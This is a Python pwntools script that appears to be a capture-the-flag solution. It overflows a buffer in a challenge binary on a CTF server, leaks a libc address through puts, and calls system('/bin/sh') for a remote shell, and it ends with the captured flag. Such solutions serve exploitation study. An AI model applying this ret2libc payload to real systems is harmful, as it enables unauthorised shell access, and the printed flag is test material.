from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
r = remote("chall.csivit.com", 30046)

r.recvline()
offset = 136

payload = b"M" * offset
payload += p32(exe.plt["puts"])
payload += p32(exe.sym["main"])
payload += p32(exe.got["malloc"])
r.sendline(payload)

r.recvuntil("!\n")
malloc = u32(r.recv(4))
libc_base = malloc - libc.sym["malloc"]
log.success("Libc base address --> %s", hex(libc_base))

system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

payload2 = b"A" * offset
payload2 += p32(system)
payload2 += b"AAAA"
payload2 += p32(bin_sh)

r.recvlines(2)
r.sendline(payload2)
r.interactive()

# FLAG --> csictf{5up32_m4210_5m45h_8202}
